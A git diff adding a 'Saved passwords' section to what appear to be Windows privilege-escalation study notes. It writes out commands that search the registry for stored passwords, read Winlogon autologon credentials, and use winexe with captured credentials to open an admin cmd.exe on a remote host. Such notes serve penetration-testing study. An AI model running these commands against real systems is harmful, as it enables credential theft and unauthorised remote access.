@@ -393,6 +393,25 @@ When this registry key is enabled, it allows non-administrator users to install 
 ![image](https://github.com/user-attachments/assets/d8b07ea9-8e38-4e1f-a47f-4e2fb3497097)
 
 
+### Saved passwords
+
+- You can query registry for saved password
+
+      reg query HKLM /f password /t REG_SZ /s
+
+- or query to find admin AUTOLOGON credentials
+
+      reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+- Spawn a cmd with admin privilege with `winexe`
+
+      winexe -U '[user]%[password]' //[ip] cmd.exe
+
+ ![image](https://github.com/user-attachments/assets/d1dedfcb-0c29-4d1d-8326-8de66e43a93f)
+
+       
+
+
 
   
 
